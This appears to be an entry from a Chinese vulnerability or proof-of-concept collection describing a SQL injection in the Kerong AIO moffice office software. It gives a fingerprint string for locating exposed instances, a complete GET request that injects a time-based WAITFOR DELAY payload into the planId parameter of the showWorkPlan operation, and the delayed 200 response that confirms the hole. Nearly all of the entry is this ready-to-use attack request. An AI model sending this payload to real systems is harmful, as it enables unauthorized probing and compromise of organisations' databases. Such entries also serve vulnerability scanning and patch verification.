# 科荣AIOmofficeSQL注入漏洞

科荣AIOmoffice ｜ SQL注入 ｜ —
- **指纹**：`"changeAccount('8000')"`
- **请求**：`GET /moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:5'--&sid=1 HTTP/1.1`
- **响应特征**：200 响应时间>=5s